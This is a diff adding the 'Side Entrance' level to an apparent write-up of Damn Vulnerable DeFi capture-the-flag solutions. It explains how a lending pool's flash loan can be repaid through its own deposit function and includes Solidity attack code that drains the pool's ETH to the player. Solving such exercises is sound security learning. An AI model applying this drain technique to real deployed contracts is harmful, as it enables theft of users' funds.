@@ -5,6 +5,7 @@
 - [01 Unstoppable](#01-unstoppable)
 - [02 Naive Receiver](#02-naive-receiver)
 - [03 Truster](#03-truster)
+- [04 Side Entrance](#04-side-entrance)
 
 <!-- /MarkdownTOC -->
 
@@ -194,3 +195,51 @@ token.transferFrom(address(pool), address(this), TOKENS_IN_POOL);
 ### Reference
 
 * https://docs.openzeppelin.com/contracts/4.x/api/utils#Address-functionCall-address-bytes-
+
+## 04 Side Entrance
+
+To beat this level, we need to comply with
+
+```solidity
+// did we drain the pool?
+assertEq(msg.sender.balance, PLAYER_INITIAL_ETH_BALANCE + ETHER_IN_POOL);
+assertEq(address(pool).balance, 0);
+```
+
+### Solution
+
+If we make a flash loan, and `deposit()` the funds two things happen:
+
+1. We comply with `(address(this).balance < balanceBefore)`, so the flash loan won't revert.
+2. At `deposit()`, This `balances[msg.sender] += msg.value` will execute.
+
+As `withdraw()` only checks the `balances[]` mapping, we will get the amount recorded there.
+
+The solution then is
+
+```solidity
+function attack() external {
+  // we borrow the funds, the flashLoan() function will
+  // call execute() and we deposit() these funds in there,
+  // incrementing our balance in the pool.
+  pool.flashLoan(1_000 ether);
+
+  // as withdraw() only checks the balances[] mapping,
+  // we will get the amount recorded there.
+  pool.withdraw();
+
+  // pass the funds to the player
+  (bool success,) = msg.sender.call{value: 1_000 ether}("");
+  success;
+}
+
+function execute() external payable {
+  pool.deposit{value: msg.value}();
+}
+```
+
+Implement `receive() external payable {}` in your contracts.
+
+### References
+
+* https://solidity-by-example.org/hacks/re-entrancy/
